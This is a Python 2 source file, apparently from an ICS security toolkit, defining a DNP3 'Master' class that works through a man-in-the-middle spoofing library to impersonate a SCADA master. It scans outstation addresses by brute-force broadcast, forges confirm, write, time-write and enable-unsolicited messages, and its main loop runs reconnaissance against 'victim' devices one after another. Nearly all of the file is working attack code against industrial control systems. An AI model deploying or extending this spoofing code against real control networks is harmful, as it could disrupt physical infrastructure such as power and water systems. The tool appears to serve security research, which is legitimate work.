__author__ = 'Nicholas Rodofile'
from DNP3_Injection import *
from MITM_Lib.Client import Client
import time

class Master(Client):
    def __init__(self, node, port, timeout_time=2*60):
        Client.__init__(self, node, port, timeout_time=timeout_time)
        self.configured_slave = False
        self.enable_spontaneous_msg = False
        self.enable_config_slave = False
        self.enable_config_slave_write = False
        self.got_response = False
        self.address_configured = False
        self.host = {"IP": self.address,
                    "master": None,
                    "slave": None}
        self.broadcast_address = 65535
        self.transport_seq = 0
        self.application_seq = 0

    def confirm_request(self, response):
        confirm = self.node.spoofer.masquerade([appFuncCode["CONFIRM"], 'Confirm'], response, SET)
        self.queue_out.put(confirm)

    def discovery_frame(self):
        read_request_msg = self.node.spoofer.masquerade([appFuncCode["READ"], 'read_request_class0123'])
        self.queue_out.put(read_request_msg)

    def record_current_time(self):
        read_request_msg = self.node.spoofer.masquerade([appFuncCode["RECORD_CURRENT_TIME"], None])
        self.queue_out.put(read_request_msg)
        self.enable_config_slave_write = True

    def write_time(self):
        read_request_msg = self.node.spoofer.masquerade([appFuncCode["WRITE"], 'write_time'])
        self.queue_out.put(read_request_msg)
        self.enable_config_slave_write = True

    def config_slave(self, response):
        #read_request_msg = self.node.spoofer.masquerade([appFuncCode["READ"], 'read_request_class0123'], response)
        #self.queue_out.put(read_request_msg)
        self.confirm_request(response)
        self.enable_config_slave = True

    def config_slave_write(self):
        write_request = self.node.spoofer.masquerade([appFuncCode["WRITE"], 'write_data_objects'])
        self.queue_out.put(write_request)
        #read_request_0123 = self.node.spoofer.masquerade([appFuncCode["READ"], 'read_request_class0123'])
        #self.queue_out.put(read_request_0123)
        self.enable_config_slave_write = True

    def enable_spontaneous(self):
        spontaneous_msg = self.node.spoofer.masquerade([appFuncCode["ENABLE_UNSOLICITED"], 'enable_spontaneous_msg'])
        self.queue_out.put(spontaneous_msg)
        self.enable_spontaneous_msg = True

    def link_status_response(self, response):
        try:
            #if response.haslayer(DNP3):
            #if response[DNP3].CONTROL.DIR == OUTSTATION:
            #    if response[DNP3].CONTROL.FUNC_CODE_PRI == 9:
            link_status = self.node.spoofer.masquerade(msg=None, pkt=response)
            link_status[DNP3].CONTROL = DNP3HeaderControl(DIR=MASTER, PRM=UNSET)
            link_status[DNP3].CONTROL.FUNC_CODE_SEC = 11 #Link status
            self.queue_out.put(link_status)
            #link_status = self.node.spoofer.masquerade(msg=None, pkt=response)
            #link_status[DNP3].CONTROL = DNP3HeaderControl(DIR=MASTER, PRM=SET)
            #link_status[DNP3].CONTROL.FUNC_CODE_PRI = 9 #Link status_request
            #self.queue_out.put(link_status)
        except:
            raise

    def broadcast(self, addresses=65535):
        while not self.running:
            if self.error:
                return
        print "broadcast", addresses
        dst = addresses
        src = self.broadcast_address
        while dst <= addresses and not self.got_response and self.running:
            while src <= addresses and not self.got_response and self.running:
                read_request_msg = self.node.spoofer.masquerade([appFuncCode["READ"], 'read_request_class0123'])
                read_request_msg[DNP3].SOURCE = src
                read_request_msg[DNP3].DESTINATION = dst
                self.send(read_request_msg)
                src += 1
            src = 0
            dst += 1
            if self.error:
                return

        if self.got_response:
            print "Found DNP3 Device Address"

        #write_config_dnp3(self.node.spoofer.source.ip_address,
        #                  str(self.node.spoofer.source.DNP3_address),
        #                  str(self.node.spoofer.destination.DNP3_address))


    def automation(self):
        sleep(10)
        self.stop()
        # if not self.running:
        #     return
        # if self.running:
        #     print "Masquerading"
        #     self.masquerade()
        # if self.running:
        #     print "Press \'q\' to quit and continue to next scan"
        # self.running = False

    def slave_restarted(self, response):
        #print "Slave has restarted"
        if response.haslayer(DNP3ApplicationResponse):
            if response[DNP3ApplicationResponse].FUNC_CODE == appFuncCode["UNSOLICITED_RESPONSE"]:
                self.config_slave(response)
                return

    # Configure DNP3 Addresses for Scanning
    def address_conf(self, response):
        self.node.spoofer.address_config(response)
        #response[DNP3].show2()
        self.host['master'] = response[DNP3].DESTINATION
        self.host['slave'] = response[DNP3].SOURCE

    def process_response(self, response):
        if not self.got_response and not self.address_configured:
            self.address_conf(response)
            self.got_response = True
            self.address_configured = True
        request = None
        if response[DNP3ApplicationIIN].DEVICE_RESTART == SET:
            self.slave_restarted(response)
            #self.discovery_frame()
            return
        self.enable_config_slave = True
        if response[DNP3ApplicationResponse].FUNC_CODE == appFuncCode["UNSOLICITED_RESPONSE"]:
            self.confirm_request(response)
            #self.discovery_frame()
            return
        if response[DNP3ApplicationControl].CON == SET:
            self.confirm_request(response)
            #self.discovery_frame()
            return
        return request

    def process_in(self):
        print "- Running in Process..."
        while self.running:
            if not self.queue_in.empty():
                try:
                    data = self.queue_in.get()
                    dnp3 = DNP3(data)
                    if dnp3.haslayer(DNP3ApplicationResponse):
                        if dnp3[DNP3Transport].FIN == UNSET:
                            pass
                        else:
                            request = self.process_response(dnp3)
                            if request is not None:
                                self.queue_out.put(request)
                    else:
                        self.link_status_response(dnp3)
                except:
                    raise
            else:
                pass
        print "- Quiting in Process..."

    def process_out(self):
        print "- Running out Process..."
        while self.running:
            if not self.queue_out.empty():
                dnp3 = self.queue_out.get()
               # print dnp3.summary()
                self.send(dnp3)
            else:
                pass

        print "- Quiting out Process..."

    def start(self):
        automation = Thread(target=self.automation)
        automation.daemon = True
        automation.start()
        super(Master, self).start()
        automation.join()
        self.socket.close()
        self.queue_out = None
        return self.host

    def quit(self):
        while self.running:
            option = str(raw_input("Enter \'Q\' to Quit\n"))
            if option == 'q' or option == 'Q':
                self.stop()


if __name__ == '__main__':
    while True:
        mitm = DNP3_MITM_conf(interface='eth0')
        mitm.init_spoofing()
        victim = mitm.victim
        master = Master(victim, dnp3_port)
        DNP = master.start()
        input_val = raw_input("Recon Next DNP3 device?")
        if input_val == 'n' or input_val == 'N':
            quit()